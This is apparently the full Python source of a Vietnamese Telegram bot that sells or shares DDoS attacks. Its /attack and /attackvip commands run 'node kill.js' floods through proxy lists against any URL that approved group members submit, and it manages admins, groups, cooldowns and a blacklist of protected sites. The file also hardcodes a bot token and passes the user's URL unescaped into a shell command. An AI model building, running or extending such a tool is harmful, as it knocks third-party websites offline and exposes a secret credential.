import requests
from telegram import InlineKeyboardButton, InlineKeyboardMarkup, Update
from telegram.ext import Updater, CommandHandler, CallbackContext
import time, threading, subprocess, json, os
from urllib.parse import quote_plus

# --- CAU HINH ---
BOT_TOKEN = "8232458883:AAFDt-PiFQcRl56wKomvRsztSJjcbVFPVpA"
ADMIN_FILE = "admins.json"
GROUPS_FILE = "groups.json"
BOT_STATUS_FILE = "bot_status.json"

PROXY_FILE = "vip.txt"
VIP_PROXY = "vip.txt"

BLACKLIST = [
    "thcsnguyentrai.pgdductrong.edu.vn", "intenseapi.com", "edu.vn",
    "thisinh.thitotnghiepthpt.edu.vn", "gov.vn", "stats.firewall.mom",
    "www.nasa.gov", "neverlosevip.store", "youtube.com", "google.com",
    "facebook.com", "chinhphu.vn"
]

MAX_USER_TIME = 120  # Gioi han time user goi attack thuong
DEFAULT_RATE = 20
DEFAULT_THREAD = 10

# --- HO TRO ĐOC GHI FILE JSON ---
def load_json_file(filename, default):
    if not os.path.exists(filename):
        return default
    with open(filename, "r") as f:
        return json.load(f)

def save_json_file(filename, data):
    with open(filename, "w") as f:
        json.dump(data, f, indent=4)

# --- TAI DU LIEU ---
admin_data = load_json_file(ADMIN_FILE, {"main_admin": 123456789, "sub_admins": []})
group_data = load_json_file(GROUPS_FILE, {"allowed_groups": []})
bot_status_data = load_json_file(BOT_STATUS_FILE, {"status": True})

ADMIN_MAIN_ID = admin_data["main_admin"]
ADMIN_IDS = [ADMIN_MAIN_ID] + admin_data["sub_admins"]
ALLOWED_GROUP_IDS = group_data["allowed_groups"]
bot_status = bot_status_data["status"]

user_last_attack_time = {}
attack_processes = []
start_time = time.time()

# --- KIEM TRA BLACKLIST ---
def is_blacklisted(url):
    return any(bl_url in url for bl_url in BLACKLIST)

# --- LENH BOT ---
def start(update: Update, context: CallbackContext):
    status_text = "ON" if bot_status else "OFF"
    update.message.reply_text(
        f"bot: [{status_text}]\n"
        f"/attack <url> <time>\n"
        f"/attackvip <url> <time> <flood|bypass>\n"
        f"/proxy\n"
        f"/time\n"
        f"/addadmin <id>, /deladmin <id>, /listadmin\n"
        f"/addgr <group_id>, /listgr, /delgr <group_id>\n"
        f"/on /off (chi admin chinh)"
    )

def turn_on(update: Update, context: CallbackContext):
    global bot_status
    if update.effective_user.id != ADMIN_MAIN_ID:
        update.message.reply_text("❌ Chi admin chinh moi bat đuoc bot.")
        return
    bot_status = True
    save_json_file(BOT_STATUS_FILE, {"status": bot_status})
    update.message.reply_text("✅ Bot đa bat.")

def turn_off(update: Update, context: CallbackContext):
    global bot_status
    if update.effective_user.id != ADMIN_MAIN_ID:
        update.message.reply_text("❌ Chi admin chinh moi tat đuoc bot.")
        return
    bot_status = False
    save_json_file(BOT_STATUS_FILE, {"status": bot_status})
    update.message.reply_text("⛔ Bot đa tat.")

def attack(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    chat_id = update.effective_chat.id
    now = time.time()

    if chat_id not in ALLOWED_GROUP_IDS:
        update.message.reply_text("❌ Nhom chua đuoc duyet.")
        return
    if not bot_status:
        update.message.reply_text("⛔ Bot đang tat.")
        return
    if user_id not in ADMIN_IDS and now - user_last_attack_time.get(user_id, 0) < MAX_USER_TIME:
        wait_time = int(MAX_USER_TIME - (now - user_last_attack_time[user_id]))
        update.message.reply_text(f"⏳ Vui long đoi {wait_time} giay nua.")
        return

    try:
        url = context.args[0]
        duration = int(context.args[1])
        if user_id not in ADMIN_IDS and duration > MAX_USER_TIME:
            update.message.reply_text(f"⏱️ Thoi gian toi đa la {MAX_USER_TIME} giay.")
            return
        if is_blacklisted(url):
            update.message.reply_text("🚫 URL nam trong blacklist.")
            return

        cmd = f"node kill.js {url} {duration} {DEFAULT_RATE} {DEFAULT_THREAD} {PROXY_FILE}"
        proc = subprocess.Popen(cmd, shell=True)
        attack_processes.append(proc)
        user_last_attack_time[user_id] = now

        check_url = f"https://check-host.net/check-http?host={quote_plus(url)}"
        keyboard = [[InlineKeyboardButton("🔎 Kiem Tra", url=check_url)]]
        reply_markup = InlineKeyboardMarkup(keyboard)

        msg = (
            f"🚀 Attack bat đau\n"
            f"👤 Nguoi goi: @{update.effective_user.username or user_id}\n"
            f"🌐 URL: {url}\n"
            f"⏰ Thoi gian: {duration} giay"
        )
        context.bot.send_message(chat_id=chat_id, text=msg, reply_markup=reply_markup)
        threading.Timer(duration, lambda: context.bot.send_message(chat_id=chat_id, text="✅ Đa hoan tat attack")).start()
    except Exception:
        update.message.reply_text("❗ Sai cu phap. Vi du: /attack <url> <time>")

def attackvip(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    chat_id = update.effective_chat.id

    if chat_id not in ALLOWED_GROUP_IDS:
        update.message.reply_text("❌ Nhom chua đuoc duyet.")
        return
    if user_id not in ADMIN_IDS:
        update.message.reply_text("🚫 Chi admin moi đuoc dung lenh nay.")
        return

    try:
        url = context.args[0]
        duration = int(context.args[1])
        method = context.args[2].lower()
        if method not in ["flood", "bypass"]:
            update.message.reply_text("❌ Phuong thuc chi co flood hoac bypass.")
            return

        cmd = f"node kill.js {url} {duration} 20 20 {VIP_PROXY} {method}"
        proc = subprocess.Popen(cmd, shell=True)
        attack_processes.append(proc)
        user_last_attack_time[user_id] = time.time()

        check_url = f"https://check-host.net/check-http?host={quote_plus(url)}"
        keyboard = [[InlineKeyboardButton("🔎 Kiem Tra", url=check_url)]]
        reply_markup = InlineKeyboardMarkup(keyboard)

        msg = (
            f"🚀 VIP Attack bat đau\n"
            f"👤 Nguoi goi: @{update.effective_user.username or user_id}\n"
            f"🌐 URL: {url}\n"
            f"🔧 Method: {method}\n"
            f"⏰ Thoi gian: {duration} giay"
        )
        context.bot.send_message(chat_id=chat_id, text=msg, reply_markup=reply_markup)
        threading.Timer(duration, lambda: context.bot.send_message(chat_id=chat_id, text="✅ VIP attack hoan tat")).start()
    except Exception:
        update.message.reply_text("❗ Sai cu phap. Vi du: /attackvip <url> <time> <flood|bypass>")

def proxy(update: Update, context: CallbackContext):
    try:
        with open("text.txt", "r") as f:
            lines = f.readlines()
        update.message.reply_text(f"So luong proxy: {len(lines)}")
        update.message.reply_document(open("text.txt", "rb"))
    except FileNotFoundError:
        update.message.reply_text("❌ Khong tim thay file proxy.")

def uptime(update: Update, context: CallbackContext):
    elapsed = int(time.time() - start_time)
    h, m, s = elapsed // 3600, (elapsed % 3600) // 60, elapsed % 60
    update.message.reply_text(f"⏱️ Bot đa chay: {h} gio, {m} phut, {s} giay")

# --- QUAN LY ADMIN ---
def addadmin(update: Update, context: CallbackContext):
    if update.effective_user.id != ADMIN_MAIN_ID:
        update.message.reply_text("❌ Chi admin chinh moi đuoc them admin.")
        return
    try:
        new_id = int(context.args[0])
        if new_id in ADMIN_IDS:
            update.message.reply_text("ℹ️ ID nay đa la admin.")
            return
        admin_data["sub_admins"].append(new_id)
        save_json_file(ADMIN_FILE, admin_data)
        ADMIN_IDS.append(new_id)
        update.message.reply_text(f"✅ Đa them admin phu: {new_id}")
    except Exception:
        update.message.reply_text("❗ Sai cu phap. Vi du: /addadmin <id>")

def deladmin(update: Update, context: CallbackContext):
    if update.effective_user.id != ADMIN_MAIN_ID:
        update.message.reply_text("❌ Chi admin chinh moi đuoc xoa admin.")
        return
    try:
        rem_id = int(context.args[0])
        if rem_id not in admin_data["sub_admins"]:
            update.message.reply_text("ℹ️ ID khong phai admin phu.")
            return
        admin_data["sub_admins"].remove(rem_id)
        save_json_file(ADMIN_FILE, admin_data)
        ADMIN_IDS.remove(rem_id)
        update.message.reply_text(f"✅ Đa xoa admin phu: {rem_id}")
    except Exception:
        update.message.reply_text("❗ Sai cu phap. Vi du: /deladmin <id>")

def listadmin(update: Update, context: CallbackContext):
    if update.effective_user.id not in ADMIN_IDS:
        return
    msg = f"👑 Admin chinh: {ADMIN_MAIN_ID}\n🛡 Admin phu: {', '.join(str(i) for i in admin_data['sub_admins'])}"
    update.message.reply_text(msg)

# --- QUAN LY NHOM ---
def addgr(update: Update, context: CallbackContext):
    if update.effective_user.id != ADMIN_MAIN_ID:
        update.message.reply_text("❌ Chi admin chinh moi them nhom.")
        return
    try:
        new_gid = int(context.args[0])
        if new_gid in ALLOWED_GROUP_IDS:
            update.message.reply_text("ℹ️ Nhom đa đuoc duyet truoc đo.")
            return
        group_data["allowed_groups"].append(new_gid)
        save_json_file(GROUPS_FILE, group_data)
        ALLOWED_GROUP_IDS.append(new_gid)

        chat = context.bot.get_chat(new_gid)
        name = chat.title or "Khong ro"
        username = f"@{chat.username}" if chat.username else "(khong co)"
        desc = chat.description or "(khong co mo ta)"
        invite = getattr(chat, "invite_link", "(chua tao link)")
        count = context.bot.get_chat_members_count(new_gid)
        slow_mode = getattr(chat, "slow_mode_delay", 0)
        protected = "✅ Co" if getattr(chat, "has_protected_content", False) else "❌ Khong"
        sticker_set = getattr(chat, "sticker_set_name", "(khong co)")

        msg = (
            f"✅ Đa duyet nhom:\n"
            f"🏷 Ten nhom: {name}\n"
            f"🆔 ID: {new_gid}\n"
            f"👥 Thanh vien: {count}\n"
            f"🔗 Username: {username}\n"
            f"📝 Mo ta: {desc}\n"
            f"🧷 Invite link: {invite}\n"
            f"🐢 Slow mode: {slow_mode} giay\n"
            f"🛡 Bao ve noi dung: {protected}\n"
            f"🎨 Bo sticker: {sticker_set}"
        )
        if chat.photo:
            file_id = chat.photo.big_file_id
            context.bot.send_photo(chat_id=update.effective_chat.id, photo=file_id, caption=msg)
        else:
            update.message.reply_text(msg)
    except Exception as e:
        update.message.reply_text(f"❌ Loi hoac khong tim thay nhom: {e}")

def delgr(update: Update, context: CallbackContext):
    if update.effective_user.id != ADMIN_MAIN_ID:
        update.message.reply_text("❌ Chi admin chinh moi xoa nhom.")
        return
    try:
        gid = int(context.args[0])
        if gid not in ALLOWED_GROUP_IDS:
            update.message.reply_text("ℹ️ Nhom khong ton tai trong danh sach.")
            return
        group_data["allowed_groups"].remove(gid)
        save_json_file(GROUPS_FILE, group_data)
        ALLOWED_GROUP_IDS.remove(gid)
        update.message.reply_text(f"🗑️ Đa xoa nhom ID: {gid}")
    except Exception:
        update.message.reply_text("❗ Sai cu phap. Vi du: /delgr <group_id>")

def listgr(update: Update, context: CallbackContext):
    if update.effective_user.id != ADMIN_MAIN_ID:
        update.message.reply_text("❌ Chi admin chinh moi xem danh sach nhom.")
        return
    if not ALLOWED_GROUP_IDS:
        update.message.reply_text("ℹ️ Chua co nhom nao đuoc duyet.")
        return
    groups_str = "\n".join(str(g) for g in ALLOWED_GROUP_IDS)
    update.message.reply_text(f"Cac nhom đa duyet:\n{groups_str}")

# --- CHAY BOT ---
def main():
    import queue
    updater = Updater(BOT_TOKEN, update_queue=queue.Queue())
    dp = updater.dispatcher

    dp.add_handler(CommandHandler("start", start))
    dp.add_handler(CommandHandler("on", turn_on))
    dp.add_handler(CommandHandler("off", turn_off))

    dp.add_handler(CommandHandler("attack", attack))
    dp.add_handler(CommandHandler("attackvip", attackvip))
    dp.add_handler(CommandHandler("proxy", proxy))
    dp.add_handler(CommandHandler("time", uptime))

    dp.add_handler(CommandHandler("addadmin", addadmin))
    dp.add_handler(CommandHandler("deladmin", deladmin))
    dp.add_handler(CommandHandler("listadmin", listadmin))

    dp.add_handler(CommandHandler("addgr", addgr))
    dp.add_handler(CommandHandler("delgr", delgr))
    dp.add_handler(CommandHandler("listgr", listgr))

    updater.start_polling()
    updater.idle()

if __name__ == "__main__":
    main()
